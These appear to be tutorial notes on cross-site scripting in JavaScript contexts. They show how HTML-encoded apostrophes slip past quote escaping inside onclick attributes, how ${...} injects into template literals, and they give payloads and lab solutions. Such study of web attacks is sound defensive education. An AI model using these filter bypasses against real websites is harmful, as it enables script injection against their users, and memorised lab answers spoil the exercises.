When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters.

For example, if the XSS context is as follows:

`<a href="#" onclick="... var input='controllable data here'; ...">`

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:

`&apos;-alert(document.domain)-&apos;`

The `&apos;` sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds. 

### Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 

Payload: `http://pwn?&apos;-alert(1)-&apos;`

### XSS in JavaScript template literals

JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax.

For example, the following script will print a welcome message that includes the user's display name:

`document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;`

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:
```html
<script>
...
var input = `controllable data here`;
...
</script>
```
then you can use the following payload to execute JavaScript without terminating the template literal:
`${alert(document.domain)}`
### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string. 

Payload: `${alert(1)}`